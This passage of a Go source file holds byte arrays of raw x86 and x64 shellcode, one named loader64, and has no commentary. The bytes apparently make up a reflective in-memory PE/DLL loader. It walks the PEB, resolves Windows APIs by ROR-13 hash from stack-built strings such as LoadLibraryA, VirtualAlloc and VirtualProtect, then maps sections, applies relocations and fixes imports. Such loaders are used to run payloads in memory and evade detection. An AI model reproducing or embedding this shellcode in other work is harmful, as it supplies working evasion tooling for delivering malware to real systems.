	0x24, 0x10, 0x75, 0x04, 0x85, 0xC9, 0x75, 0x15, 0x8B, 0x44, 0x24, 0x30, 0x83, 0xC7, 0x04, 0x40, 0x83, 0xC1, 0x02, 0x89, 0x44, 0x24,
	0x30, 0x3B, 0xC5, 0x72, 0xAE, 0xEB, 0x20, 0x0F, 0xB7, 0x09, 0x8B, 0x42, 0x1C, 0xFF, 0xB4, 0x24, 0x34, 0x01, 0x00, 0x00, 0xFF, 0xB4,
	0x24, 0x34, 0x01, 0x00, 0x00, 0x8D, 0x04, 0x88, 0x8B, 0x04, 0x18, 0x03, 0xC3, 0xFF, 0xD0, 0x59, 0x59, 0x8B, 0xC3, 0xEB, 0x02, 0x33,
	0xC0, 0x5F, 0x5E, 0x5D, 0x5B, 0x81, 0xC4, 0x14, 0x01, 0x00, 0x00, 0xC3, 0x83, 0xEC, 0x14, 0x64, 0xA1, 0x30, 0x00, 0x00, 0x00, 0x53,
	0x55, 0x56, 0x8B, 0x40, 0x0C, 0x57, 0x89, 0x4C, 0x24, 0x1C, 0x8B, 0x78, 0x0C, 0xE9, 0xA5, 0x00, 0x00, 0x00, 0x8B, 0x47, 0x30, 0x33,
	0xF6, 0x8B, 0x5F, 0x2C, 0x8B, 0x3F, 0x89, 0x44, 0x24, 0x10, 0x8B, 0x42, 0x3C, 0x89, 0x7C, 0x24, 0x14, 0x8B, 0x6C, 0x10, 0x78, 0x89,
	0x6C, 0x24, 0x18, 0x85, 0xED, 0x0F, 0x84, 0x80, 0x00, 0x00, 0x00, 0xC1, 0xEB, 0x10, 0x33, 0xC9, 0x85, 0xDB, 0x74, 0x2F, 0x8B, 0x7C,
	0x24, 0x10, 0x0F, 0xBE, 0x2C, 0x0F, 0xC1, 0xCE, 0x0D, 0x80, 0x3C, 0x0F, 0x61, 0x89, 0x6C, 0x24, 0x10, 0x7C, 0x09, 0x8B, 0xC5, 0x83,
	0xC0, 0xE0, 0x03, 0xF0, 0xEB, 0x04, 0x03, 0x74, 0x24, 0x10, 0x41, 0x3B, 0xCB, 0x72, 0xDD, 0x8B, 0x7C, 0x24, 0x14, 0x8B, 0x6C, 0x24,
	0x18, 0x8B, 0x44, 0x2A, 0x20, 0x33, 0xDB, 0x8B, 0x4C, 0x2A, 0x18, 0x03, 0xC2, 0x89, 0x4C, 0x24, 0x10, 0x85, 0xC9, 0x74, 0x34, 0x8B,
	0x38, 0x33, 0xED, 0x03, 0xFA, 0x83, 0xC0, 0x04, 0x89, 0x44, 0x24, 0x20, 0x8A, 0x0F, 0xC1, 0xCD, 0x0D, 0x0F, 0xBE, 0xC1, 0x03, 0xE8,
	0x47, 0x84, 0xC9, 0x75, 0xF1, 0x8B, 0x7C, 0x24, 0x14, 0x8D, 0x04, 0x2E, 0x3B, 0x44, 0x24, 0x1C, 0x74, 0x20, 0x8B, 0x44, 0x24, 0x20,
	0x43, 0x3B, 0x5C, 0x24, 0x10, 0x72, 0xCC, 0x8B, 0x57, 0x18, 0x85, 0xD2, 0x0F, 0x85, 0x50, 0xFF, 0xFF, 0xFF, 0x33, 0xC0, 0x5F, 0x5E,
	0x5D, 0x5B, 0x83, 0xC4, 0x14, 0xC3, 0x8B, 0x74, 0x24, 0x18, 0x8B, 0x44, 0x16, 0x24, 0x8D, 0x04, 0x58, 0x0F, 0xB7, 0x0C, 0x10, 0x8B,
	0x44, 0x16, 0x1C, 0x8D, 0x04, 0x88, 0x8B, 0x04, 0x10, 0x03, 0xC2, 0xEB, 0xDB,
}
var loader64 = [...]byte{
	0x48, 0x8B, 0xC4, 0x48, 0x89, 0x58, 0x08, 0x44, 0x89, 0x48, 0x20, 0x4C, 0x89, 0x40, 0x18, 0x89, 0x50, 0x10, 0x55, 0x56, 0x57, 0x41,
	0x54, 0x41, 0x55, 0x41, 0x56, 0x41, 0x57, 0x48, 0x8D, 0x6C, 0x24, 0x90, 0x48, 0x81, 0xEC, 0x70, 0x01, 0x00, 0x00, 0x45, 0x33, 0xFF,
	0xC7, 0x45, 0xD8, 0x6B, 0x00, 0x65, 0x00, 0x48, 0x8B, 0xF1, 0x4C, 0x89, 0x7D, 0xF8, 0xB9, 0x13, 0x9C, 0xBF, 0xBD, 0x4C, 0x89, 0x7D,
	0xC8, 0x4C, 0x89, 0x7D, 0x08, 0x45, 0x8D, 0x4F, 0x65, 0x4C, 0x89, 0x7D, 0x10, 0x44, 0x88, 0x4D, 0xBC, 0x44, 0x88, 0x4D, 0xA2, 0x4C,
	0x89, 0x7D, 0x00, 0x4C, 0x89, 0x7D, 0xF0, 0x4C, 0x89, 0x7D, 0x18, 0x44, 0x89, 0x7D, 0x24, 0x44, 0x89, 0x7C, 0x24, 0x2C, 0xC7, 0x45,
	0xDC, 0x72, 0x00, 0x6E, 0x00, 0xC7, 0x45, 0xE0, 0x65, 0x00, 0x6C, 0x00, 0xC7, 0x45, 0xE4, 0x33, 0x00, 0x32, 0x00, 0xC7, 0x45, 0xE8,
	0x2E, 0x00, 0x64, 0x00, 0xC7, 0x45, 0xEC, 0x6C, 0x00, 0x6C, 0x00, 0xC7, 0x44, 0x24, 0x40, 0x53, 0x6C, 0x65, 0x65, 0xC6, 0x44, 0x24,
	0x44, 0x70, 0xC7, 0x44, 0x24, 0x58, 0x4C, 0x6F, 0x61, 0x64, 0xC7, 0x44, 0x24, 0x5C, 0x4C, 0x69, 0x62, 0x72, 0xC7, 0x44, 0x24, 0x60,
	0x61, 0x72, 0x79, 0x41, 0xC7, 0x44, 0x24, 0x48, 0x56, 0x69, 0x72, 0x74, 0xC7, 0x44, 0x24, 0x4C, 0x75, 0x61, 0x6C, 0x41, 0xC7, 0x44,
	0x24, 0x50, 0x6C, 0x6C, 0x6F, 0x63, 0xC7, 0x44, 0x24, 0x68, 0x56, 0x69, 0x72, 0x74, 0xC7, 0x44, 0x24, 0x6C, 0x75, 0x61, 0x6C, 0x50,
	0xC7, 0x44, 0x24, 0x70, 0x72, 0x6F, 0x74, 0x65, 0x66, 0xC7, 0x44, 0x24, 0x74, 0x63, 0x74, 0xC7, 0x45, 0xA8, 0x46, 0x6C, 0x75, 0x73,
	0xC7, 0x45, 0xAC, 0x68, 0x49, 0x6E, 0x73, 0xC7, 0x45, 0xB0, 0x74, 0x72, 0x75, 0x63, 0xC7, 0x45, 0xB4, 0x74, 0x69, 0x6F, 0x6E, 0xC7,
	0x45, 0xB8, 0x43, 0x61, 0x63, 0x68, 0xC7, 0x44, 0x24, 0x78, 0x47, 0x65, 0x74, 0x4E, 0xC7, 0x44, 0x24, 0x7C, 0x61, 0x74, 0x69, 0x76,
	0xC7, 0x45, 0x80, 0x65, 0x53, 0x79, 0x73, 0xC7, 0x45, 0x84, 0x74, 0x65, 0x6D, 0x49, 0x66, 0xC7, 0x45, 0x88, 0x6E, 0x66, 0xC6, 0x45,
	0x8A, 0x6F, 0xC7, 0x45, 0x90, 0x52, 0x74, 0x6C, 0x41, 0xC7, 0x45, 0x94, 0x64, 0x64, 0x46, 0x75, 0xC7, 0x45, 0x98, 0x6E, 0x63, 0x74,
	0x69, 0xC7, 0x45, 0x9C, 0x6F, 0x6E, 0x54, 0x61, 0x66, 0xC7, 0x45, 0xA0, 0x62, 0x6C, 0xE8, 0x7F, 0x08, 0x00, 0x00, 0xB9, 0xB5, 0x41,
	0xD9, 0x5E, 0x48, 0x8B, 0xD8, 0xE8, 0x72, 0x08, 0x00, 0x00, 0x4C, 0x8B, 0xE8, 0x48, 0x89, 0x45, 0xD0, 0x48, 0x8D, 0x45, 0xD8, 0xC7,
	0x45, 0x20, 0x18, 0x00, 0x18, 0x00, 0x4C, 0x8D, 0x4C, 0x24, 0x38, 0x48, 0x89, 0x45, 0x28, 0x4C, 0x8D, 0x45, 0x20, 0x33, 0xD2, 0x33,
	0xC9, 0xFF, 0xD3, 0x48, 0x8B, 0x4C, 0x24, 0x38, 0x48, 0x8D, 0x44, 0x24, 0x48, 0x45, 0x33, 0xC0, 0x48, 0x89, 0x44, 0x24, 0x30, 0x4C,
	0x8D, 0x4D, 0xC8, 0xC7, 0x44, 0x24, 0x28, 0x0C, 0x00, 0x0C, 0x00, 0x48, 0x8D, 0x54, 0x24, 0x28, 0x41, 0xFF, 0xD5, 0x48, 0x8B, 0x4C,
	0x24, 0x38, 0x48, 0x8D, 0x44, 0x24, 0x68, 0x45, 0x33, 0xC0, 0x48, 0x89, 0x44, 0x24, 0x30, 0x4C, 0x8D, 0x4D, 0x00, 0xC7, 0x44, 0x24,
	0x28, 0x0E, 0x00, 0x0E, 0x00, 0x48, 0x8D, 0x54, 0x24, 0x28, 0x41, 0xFF, 0xD5, 0x48, 0x8D, 0x45, 0xA8, 0xC7, 0x44, 0x24, 0x28, 0x15,
	0x00, 0x15, 0x00, 0x48, 0x8B, 0x4C, 0x24, 0x38, 0x4C, 0x8D, 0x4D, 0x08, 0x45, 0x33, 0xC0, 0x48, 0x89, 0x44, 0x24, 0x30, 0x48, 0x8D,
	0x54, 0x24, 0x28, 0x41, 0xFF, 0xD5, 0x48, 0x8B, 0x4C, 0x24, 0x38, 0x48, 0x8D, 0x44, 0x24, 0x78, 0x45, 0x33, 0xC0, 0x48, 0x89, 0x44,
	0x24, 0x30, 0x4C, 0x8D, 0x4D, 0x10, 0xC7, 0x44, 0x24, 0x28, 0x13, 0x00, 0x13, 0x00, 0x48, 0x8D, 0x54, 0x24, 0x28, 0x41, 0xFF, 0xD5,
	0x48, 0x8B, 0x4C, 0x24, 0x38, 0x48, 0x8D, 0x44, 0x24, 0x40, 0x45, 0x33, 0xC0, 0x48, 0x89, 0x44, 0x24, 0x30, 0x4C, 0x8D, 0x4D, 0xF0,
	0xC7, 0x44, 0x24, 0x28, 0x05, 0x00, 0x05, 0x00, 0x48, 0x8D, 0x54, 0x24, 0x28, 0x41, 0xFF, 0xD5, 0x48, 0x8B, 0x4C, 0x24, 0x38, 0x48,
	0x8D, 0x45, 0x90, 0x45, 0x33, 0xC0, 0x48, 0x89, 0x44, 0x24, 0x30, 0x4C, 0x8D, 0x4D, 0x18, 0xC7, 0x44, 0x24, 0x28, 0x13, 0x00, 0x13,
	0x00, 0x48, 0x8D, 0x54, 0x24, 0x28, 0x41, 0xFF, 0xD5, 0x48, 0x8B, 0x4C, 0x24, 0x38, 0x48, 0x8D, 0x44, 0x24, 0x58, 0x45, 0x33, 0xC0,
	0x48, 0x89, 0x44, 0x24, 0x30, 0x4C, 0x8D, 0x4D, 0xF8, 0xC7, 0x44, 0x24, 0x28, 0x0C, 0x00, 0x0C, 0x00, 0x48, 0x8D, 0x54, 0x24, 0x28,
	0x41, 0xFF, 0xD5, 0x4C, 0x39, 0x7D, 0xC8, 0x0F, 0x84, 0x1D, 0x07, 0x00, 0x00, 0x4C, 0x39, 0x7D, 0x00, 0x0F, 0x84, 0x13, 0x07, 0x00,
	0x00, 0x4C, 0x39, 0x7D, 0xF0, 0x0F, 0x84, 0x09, 0x07, 0x00, 0x00, 0x4C, 0x39, 0x7D, 0x08, 0x0F, 0x84, 0xFF, 0x06, 0x00, 0x00, 0x48,
	0x8B, 0x55, 0x10, 0x48, 0x85, 0xD2, 0x0F, 0x84, 0xF2, 0x06, 0x00, 0x00, 0x48, 0x63, 0x7E, 0x3C, 0x48, 0x03, 0xFE, 0x81, 0x3F, 0x50,
	0x45, 0x00, 0x00, 0x0F, 0x85, 0xDF, 0x06, 0x00, 0x00, 0xB8, 0x64, 0x86, 0x00, 0x00, 0x66, 0x39, 0x47, 0x04, 0x0F, 0x85, 0xD0, 0x06,
	0x00, 0x00, 0x45, 0x8D, 0x4F, 0x01, 0x44, 0x84, 0x4F, 0x38, 0x0F, 0x85, 0xC2, 0x06, 0x00, 0x00, 0x0F, 0xB7, 0x4F, 0x14, 0x41, 0x8B,
	0xDF, 0x48, 0x83, 0xC1, 0x24, 0x66, 0x44, 0x3B, 0x7F, 0x06, 0x73, 0x25, 0x44, 0x0F, 0xB7, 0x47, 0x06, 0x48, 0x03, 0xCF, 0x44, 0x39,
	0x79, 0x04, 0x8B, 0x47, 0x38, 0x0F, 0x45, 0x41, 0x04, 0x03, 0x01, 0x48, 0x8D, 0x49, 0x28, 0x3B, 0xC3, 0x0F, 0x46, 0xC3, 0x8B, 0xD8,
	0x4D, 0x2B, 0xC1, 0x75, 0xE3, 0x48, 0x8D, 0x4D, 0x38, 0xFF, 0xD2, 0x8B, 0x55, 0x3C, 0x44, 0x8B, 0xC2, 0x44, 0x8D, 0x72, 0xFF, 0xF7,
	0xDA, 0x44, 0x03, 0x77, 0x50, 0x49, 0x8D, 0x48, 0xFF, 0x8B, 0xC2, 0x4C, 0x23, 0xF0, 0x8B, 0xC3, 0x48, 0x03, 0xC8, 0x49, 0x8D, 0x40,
	0xFF, 0x48, 0xF7, 0xD0, 0x48, 0x23, 0xC8, 0x4C, 0x3B, 0xF1, 0x0F, 0x85, 0x54, 0x06, 0x00, 0x00, 0x48, 0x8B, 0x4F, 0x30, 0x41, 0xBC,
	0x00, 0x30, 0x00, 0x00, 0x45, 0x8B, 0xC4, 0x41, 0xB9, 0x04, 0x00, 0x00, 0x00, 0x49, 0x8B, 0xD6, 0xFF, 0x55, 0xC8, 0x48, 0x8B, 0xD8,
	0x48, 0x85, 0xC0, 0x75, 0x12, 0x44, 0x8D, 0x48, 0x04, 0x45, 0x8B, 0xC4, 0x49, 0x8B, 0xD6, 0x33, 0xC9, 0xFF, 0x55, 0xC8, 0x48, 0x8B,
	0xD8, 0x44, 0x8B, 0xA5, 0xD0, 0x00, 0x00, 0x00, 0x41, 0xBB, 0x01, 0x00, 0x00, 0x00, 0x45, 0x84, 0xE3, 0x74, 0x1D, 0x8B, 0x46, 0x3C,
	0x89, 0x43, 0x3C, 0x8B, 0x56, 0x3C, 0xEB, 0x0B, 0x8B, 0xCA, 0x41, 0x03, 0xD3, 0x8A, 0x04, 0x31, 0x88, 0x04, 0x19, 0x3B, 0x57, 0x54,
	0x72, 0xF0, 0xEB, 0x19, 0x41, 0x8B, 0xD7, 0x44, 0x39, 0x7F, 0x54, 0x76, 0x10, 0x8B, 0xCA, 0x41, 0x03, 0xD3, 0x8A, 0x04, 0x31, 0x88,
	0x04, 0x19, 0x3B, 0x57, 0x54, 0x72, 0xF0, 0x48, 0x63, 0x7B, 0x3C, 0x45, 0x8B, 0xD7, 0x48, 0x03, 0xFB, 0x48, 0x89, 0x7D, 0x30, 0x44,
	0x0F, 0xB7, 0x47, 0x14, 0x49, 0x83, 0xC0, 0x28, 0x66, 0x44, 0x3B, 0x7F, 0x06, 0x73, 0x3A, 0x4C, 0x03, 0xC7, 0x45, 0x8B, 0xCF, 0x45,
	0x39, 0x38, 0x76, 0x1F, 0x41, 0x8B, 0x50, 0x04, 0x41, 0x8B, 0x48, 0xFC, 0x41, 0x8B, 0xC1, 0x45, 0x03, 0xCB, 0x48, 0x03, 0xC8, 0x48,
	0x03, 0xD0, 0x8A, 0x04, 0x32, 0x88, 0x04, 0x19, 0x45, 0x3B, 0x08, 0x72, 0xE1, 0x0F, 0xB7, 0x47, 0x06, 0x45, 0x03, 0xD3, 0x49, 0x83,
	0xC0, 0x28, 0x44, 0x3B, 0xD0, 0x72, 0xC9, 0x4C, 0x8B, 0xF3, 0x41, 0xB8, 0x02, 0x00, 0x00, 0x00, 0x4C, 0x2B, 0x77, 0x30, 0x0F, 0x84,
	0xD6, 0x00, 0x00, 0x00, 0x44, 0x39, 0xBF, 0xB4, 0x00, 0x00, 0x00, 0x0F, 0x84, 0xC9, 0x00, 0x00, 0x00, 0x44, 0x8B, 0x8F, 0xB0, 0x00,
	0x00, 0x00, 0x4C, 0x03, 0xCB, 0x45, 0x39, 0x39, 0x0F, 0x84, 0xB6, 0x00, 0x00, 0x00, 0x4D, 0x8D, 0x51, 0x08, 0xE9, 0x91, 0x00, 0x00,
	0x00, 0x45, 0x0F, 0xB7, 0x1A, 0x41, 0x0F, 0xB7, 0xCB, 0x41, 0x0F, 0xB7, 0xC3, 0x66, 0xC1, 0xE9, 0x0C, 0x66, 0x83, 0xF9, 0x0A, 0x75,
	0x29, 0x45, 0x8B, 0x01, 0x41, 0x81, 0xE3, 0xFF, 0x0F, 0x00, 0x00, 0x4B, 0x8D, 0x04, 0x18, 0x48, 0x8B, 0x14, 0x18, 0x4B, 0x8D, 0x04,
	0x18, 0x41, 0xBB, 0x01, 0x00, 0x00, 0x00, 0x49, 0x03, 0xD6, 0x48, 0x89, 0x14, 0x18, 0x45, 0x8D, 0x43, 0x01, 0xEB, 0x4F, 0x41, 0xBB,
	0x01, 0x00, 0x00, 0x00, 0x66, 0x83, 0xF9, 0x03, 0x75, 0x0E, 0x25, 0xFF, 0x0F, 0x00, 0x00, 0x48, 0x8D, 0x0C, 0x03, 0x41, 0x8B, 0xC6,
	0xEB, 0x2E, 0x66, 0x41, 0x3B, 0xCB, 0x75, 0x15, 0x25, 0xFF, 0x0F, 0x00, 0x00, 0x48, 0x8D, 0x0C, 0x03, 0x49, 0x8B, 0xC6, 0x48, 0xC1,
	0xE8, 0x10, 0x0F, 0xB7, 0xC0, 0xEB, 0x13, 0x66, 0x41, 0x3B, 0xC8, 0x75, 0x14, 0x25, 0xFF, 0x0F, 0x00, 0x00, 0x48, 0x8D, 0x0C, 0x03,
	0x41, 0x0F, 0xB7, 0xC6, 0x41, 0x8B, 0x11, 0x48, 0x01, 0x04, 0x0A, 0x4D, 0x03, 0xD0, 0x41, 0x8B, 0x41, 0x04, 0x49, 0x03, 0xC1, 0x4C,
	0x3B, 0xD0, 0x0F, 0x85, 0x5F, 0xFF, 0xFF, 0xFF, 0x4D, 0x8B, 0xCA, 0x45, 0x39, 0x3A, 0x0F, 0x85, 0x4A, 0xFF, 0xFF, 0xFF, 0x44, 0x39,
	0xBF, 0x94, 0x00, 0x00, 0x00, 0x0F, 0x84, 0x82, 0x01, 0x00, 0x00, 0x8B, 0x8F, 0x90, 0x00, 0x00, 0x00, 0x45, 0x8B, 0xEF, 0x4C, 0x8D,
	0x04, 0x19, 0x49, 0x8D, 0x40, 0x0C, 0xEB, 0x07, 0x45, 0x03, 0xEB, 0x48, 0x8D, 0x40, 0x14, 0x44, 0x39, 0x38, 0x75, 0xF4, 0x41, 0x8B,
	0xC4, 0x83, 0xE0, 0x04, 0x89, 0x45, 0xC0, 0x8B, 0xC1, 0x0F, 0x84, 0x89, 0x00, 0x00, 0x00, 0x45, 0x3B, 0xEB, 0x0F, 0x86, 0x80, 0x00,
	0x00, 0x00, 0x41, 0xC1, 0xEC, 0x10, 0x45, 0x8D, 0x5D, 0xFF, 0x45, 0x8B, 0xD7, 0x45, 0x85, 0xDB, 0x74, 0x74, 0x4D, 0x8B, 0xC8, 0x41,
	0xBE, 0xFF, 0x7F, 0x00, 0x00, 0x41, 0x0F, 0x10, 0x01, 0x33, 0xD2, 0x41, 0x8B, 0xCD, 0x41, 0x2B, 0xCA, 0x69, 0xF6, 0xFD, 0x43, 0x03,
	0x00, 0x41, 0x8B, 0xC6, 0xF7, 0xF1, 0x33, 0xD2, 0x81, 0xC6, 0xC3, 0x9E, 0x26, 0x00, 0x8D, 0x48, 0x01, 0x8B, 0xC6, 0xC1, 0xE8, 0x10,
	0x41, 0x23, 0xC6, 0xF7, 0xF1, 0x41, 0x03, 0xC2, 0x41, 0xFF, 0xC2, 0x48, 0x8D, 0x0C, 0x80, 0x41, 0x8B, 0x54, 0x88, 0x10, 0x41, 0x0F,
	0x10, 0x0C, 0x88, 0x41, 0x0F, 0x11, 0x04, 0x88, 0x41, 0x8B, 0x41, 0x10, 0x41, 0x89, 0x44, 0x88, 0x10, 0x41, 0x0F, 0x11, 0x09, 0x41,
	0x89, 0x51, 0x10, 0x4D, 0x8D, 0x49, 0x14, 0x45, 0x3B, 0xD3, 0x72, 0xA1, 0x8B, 0x87, 0x90, 0x00, 0x00, 0x00, 0xEB, 0x04, 0x44, 0x8B,
	0x65, 0xC0, 0x8B, 0xF0, 0x48, 0x03, 0xF3, 0x8B, 0x46, 0x0C, 0x85, 0xC0, 0x0F, 0x84, 0xB1, 0x00, 0x00, 0x00, 0x8B, 0x7D, 0xC0, 0x8B,
	0xC8, 0x48, 0x03, 0xCB, 0xFF, 0x55, 0xF8, 0x48, 0x89, 0x44, 0x24, 0x38, 0x4C, 0x8B, 0xD0, 0x44, 0x8B, 0x36, 0x44, 0x8B, 0x7E, 0x10,
	0x4C, 0x03, 0xF3, 0x4C, 0x03, 0xFB, 0x49, 0x8B, 0x0E, 0x48, 0x85, 0xC9, 0x74, 0x5F, 0x48, 0x85, 0xC9, 0x79, 0x08, 0x45, 0x0F, 0xB7,
	0x06, 0x33, 0xD2, 0xEB, 0x32, 0x48, 0x8D, 0x53, 0x02, 0x33, 0xC0, 0x48, 0x03, 0xD1, 0x38, 0x02, 0x74, 0x0E, 0x48, 0x8B, 0xCA, 0x48,
	0xFF, 0xC1, 0x48, 0xFF, 0xC0, 0x80, 0x39, 0x00, 0x75, 0xF5, 0x48, 0x89, 0x54, 0x24, 0x30, 0x45, 0x33, 0xC0, 0x48, 0x8D, 0x54, 0x24,
	0x28, 0x66, 0x89, 0x44, 0x24, 0x28, 0x66, 0x89, 0x44, 0x24, 0x2A, 0x4D, 0x8B, 0xCF, 0x49, 0x8B, 0xCA, 0xFF, 0x55, 0xD0, 0x49, 0x83,
	0xC6, 0x08, 0x49, 0x83, 0xC7, 0x08, 0x49, 0x8B, 0x0E, 0x48, 0x85, 0xC9, 0x74, 0x07, 0x4C, 0x8B, 0x54, 0x24, 0x38, 0xEB, 0xA1, 0x45,
	0x33, 0xFF, 0x85, 0xFF, 0x74, 0x10, 0x41, 0x83, 0xFD, 0x01, 0x76, 0x0A, 0x41, 0x69, 0xCC, 0xE8, 0x03, 0x00, 0x00, 0xFF, 0x55, 0xF0,
	0x8B, 0x46, 0x20, 0x48, 0x83, 0xC6, 0x14, 0x85, 0xC0, 0x0F, 0x85, 0x56, 0xFF, 0xFF, 0xFF, 0x48, 0x8B, 0x7D, 0x30, 0x4C, 0x8B, 0x6D,
	0xD0, 0x44, 0x39, 0xBF, 0xF4, 0x00, 0x00, 0x00, 0x0F, 0x84, 0xA9, 0x00, 0x00, 0x00, 0x44, 0x8B, 0xBF, 0xF0, 0x00, 0x00, 0x00, 0x49,
	0x83, 0xC7, 0x04, 0x4C, 0x03, 0xFB, 0x45, 0x33, 0xE4, 0x41, 0x8B, 0x07, 0x85, 0xC0, 0x0F, 0x84, 0x8A, 0x00, 0x00, 0x00, 0x8B, 0xC8,
	0x48, 0x03, 0xCB, 0xFF, 0x55, 0xF8, 0x48, 0x89, 0x44, 0x24, 0x38, 0x48, 0x8B, 0xC8, 0x41, 0x8B, 0x77, 0x08, 0x45, 0x8B, 0x77, 0x0C,
	0x48, 0x03, 0xF3, 0x4C, 0x03, 0xF3, 0x4C, 0x39, 0x26, 0x74, 0x5E, 0x49, 0x8B, 0x16, 0x48, 0x85, 0xD2, 0x79, 0x08, 0x44, 0x0F, 0xB7,
	0xC2, 0x33, 0xD2, 0xEB, 0x34, 0x4C, 0x8D, 0x43, 0x02, 0x49, 0x8B, 0xC4, 0x4C, 0x03, 0xC2, 0x45, 0x38, 0x20, 0x74, 0x0E, 0x49, 0x8B,
	0xD0, 0x48, 0xFF, 0xC2, 0x48, 0xFF, 0xC0, 0x44, 0x38, 0x22, 0x75, 0xF5, 0x4C, 0x89, 0x44, 0x24, 0x30, 0x48, 0x8D, 0x54, 0x24, 0x28,
	0x45, 0x33, 0xC0, 0x66, 0x89, 0x44, 0x24, 0x28, 0x66, 0x89, 0x44, 0x24, 0x2A, 0x4C, 0x8B, 0xCE, 0x41, 0xFF, 0xD5, 0x48, 0x83, 0xC6,
	0x08, 0x49, 0x83, 0xC6, 0x08, 0x4C, 0x39, 0x26, 0x74, 0x07, 0x48, 0x8B, 0x4C, 0x24, 0x38, 0xEB, 0xA2, 0x49, 0x83, 0xC7, 0x20, 0xE9,
	0x6B, 0xFF, 0xFF, 0xFF, 0x45, 0x33, 0xFF, 0x0F, 0xB7, 0x77, 0x14, 0x45, 0x8B, 0xF7, 0x48, 0x83, 0xC6, 0x28, 0x41, 0xBC, 0x01, 0x00,
	0x00, 0x00, 0x66, 0x44, 0x3B, 0x7F, 0x06, 0x0F, 0x83, 0x0B, 0x01, 0x00, 0x00, 0x48, 0x03, 0xF7, 0x44, 0x39, 0x3E, 0x0F, 0x84, 0xEB,
	0x00, 0x00, 0x00, 0x8B, 0x46, 0x14, 0x8B, 0xC8, 0x81, 0xE1, 0x00, 0x00, 0x00, 0x20, 0x75, 0x17, 0x0F, 0xBA, 0xE0, 0x1E, 0x72, 0x11,
	0x85, 0xC0, 0x78, 0x0D, 0x45, 0x8B, 0xC4, 0x44, 0x89, 0x64, 0x24, 0x20, 0xE9, 0xA4, 0x00, 0x00, 0x00, 0x85, 0xC9, 0x75, 0x3C, 0x0F,
	0xBA, 0xE0, 0x1E, 0x72, 0x0A, 0x85, 0xC0, 0x79, 0x06, 0x44, 0x8D, 0x41, 0x08, 0xEB, 0x68, 0x85, 0xC9, 0x75, 0x28, 0x0F, 0xBA, 0xE0,
	0x1E, 0x73, 0x0A, 0x85, 0xC0, 0x78, 0x06, 0x44, 0x8D, 0x41, 0x02, 0xEB, 0x54, 0x85, 0xC9, 0x75, 0x14, 0x0F, 0xBA, 0xE0, 0x1E, 0x73,
	0x0A, 0x85, 0xC0, 0x79, 0x06, 0x44, 0x8D, 0x41, 0x04, 0xEB, 0x40, 0x85, 0xC9, 0x74, 0x5F, 0x0F, 0xBA, 0xE0, 0x1E, 0x72, 0x0C, 0x85,
	0xC0, 0x78, 0x08, 0x41, 0xB8, 0x10, 0x00, 0x00, 0x00, 0xEB, 0x2A, 0x85, 0xC9, 0x74, 0x49, 0x0F, 0xBA, 0xE0, 0x1E, 0x72, 0x0C, 0x85,
	0xC0, 0x79, 0x08, 0x41, 0xB8, 0x80, 0x00, 0x00, 0x00, 0xEB, 0x14, 0x85, 0xC9, 0x74, 0x33, 0x0F, 0xBA, 0xE0, 0x1E, 0x73, 0x11, 0x85,
	0xC0, 0x78, 0x0D, 0x41, 0xB8, 0x20, 0x00, 0x00, 0x00, 0x44, 0x89, 0x44, 0x24, 0x20, 0xEB, 0x21, 0x85, 0xC9, 0x74, 0x18, 0x0F, 0xBA,
	0xE0, 0x1E, 0x73, 0x12, 0x44, 0x8B, 0x44, 0x24, 0x20, 0x85, 0xC0, 0xB9, 0x40, 0x00, 0x00, 0x00, 0x44, 0x0F, 0x48, 0xC1, 0xEB, 0xDD,
	0x44, 0x8B, 0x44, 0x24, 0x20, 0xF7, 0x46, 0x14, 0x00, 0x00, 0x00, 0x04, 0x74, 0x0A, 0x41, 0x0F, 0xBA, 0xE8, 0x09, 0x44, 0x89, 0x44,
	0x24, 0x20, 0x8B, 0x4E, 0xFC, 0x4C, 0x8D, 0x4C, 0x24, 0x20, 0x8B, 0x16, 0x48, 0x03, 0xCB, 0xFF, 0x55, 0x00, 0x0F, 0xB7, 0x47, 0x06,
	0x45, 0x03, 0xF4, 0x48, 0x83, 0xC6, 0x28, 0x44, 0x3B, 0xF0, 0x0F, 0x82, 0xF8, 0xFE, 0xFF, 0xFF, 0x45, 0x33, 0xC0, 0x33, 0xD2, 0x48,
	0x83, 0xC9, 0xFF, 0xFF, 0x55, 0x08, 0x44, 0x39, 0xBF, 0xD4, 0x00, 0x00, 0x00, 0x74, 0x24, 0x8B, 0x87, 0xD0, 0x00, 0x00, 0x00, 0x48,
	0x8B, 0x74, 0x18, 0x18, 0xEB, 0x0F, 0x45, 0x33, 0xC0, 0x41, 0x8B, 0xD4, 0x48, 0x8B, 0xCB, 0xFF, 0xD0, 0x48, 0x8D, 0x76, 0x08, 0x48,
	0x8B, 0x06, 0x48, 0x85, 0xC0, 0x75, 0xE9, 0x4C, 0x8B, 0x4D, 0x18, 0x4D, 0x85, 0xC9, 0x74, 0x2F, 0x8B, 0x87, 0xA4, 0x00, 0x00, 0x00,
	0x85, 0xC0, 0x74, 0x25, 0x8B, 0xC8, 0x4C, 0x8B, 0xC3, 0x48, 0xB8, 0xAB, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0x48, 0xF7, 0xE1,
	0x8B, 0x8F, 0xA0, 0x00, 0x00, 0x00, 0x48, 0xC1, 0xEA, 0x03, 0x48, 0x03, 0xCB, 0x41, 0x2B, 0xD4, 0x41, 0xFF, 0xD1, 0x8B, 0x47, 0x28,
	0x4D, 0x8B, 0xC4, 0x48, 0x03, 0xC3, 0x41, 0x8B, 0xD4, 0x48, 0x8B, 0xCB, 0xFF, 0xD0, 0x8B, 0xB5, 0xB8, 0x00, 0x00, 0x00, 0x85, 0xF6,
	0x0F, 0x84, 0x97, 0x00, 0x00, 0x00, 0x44, 0x39, 0xBF, 0x8C, 0x00, 0x00, 0x00, 0x0F, 0x84, 0x8A, 0x00, 0x00, 0x00, 0x8B, 0x8F, 0x88,
	0x00, 0x00, 0x00, 0x48, 0x03, 0xCB, 0x44, 0x8B, 0x59, 0x18, 0x45, 0x85, 0xDB, 0x74, 0x78, 0x44, 0x39, 0x79, 0x14, 0x74, 0x72, 0x44,
	0x8B, 0x49, 0x20, 0x41, 0x8B, 0xFF, 0x8B, 0x51, 0x24, 0x4C, 0x03, 0xCB, 0x48, 0x03, 0xD3, 0x45, 0x85, 0xDB, 0x74, 0x5D, 0x45, 0x8B,
	0x01, 0x45, 0x8B, 0xD7, 0x4C, 0x03, 0xC3, 0x74, 0x52, 0xEB, 0x0D, 0x0F, 0xBE, 0xC0, 0x44, 0x03, 0xD0, 0x41, 0xC1, 0xCA, 0x0D, 0x4D,
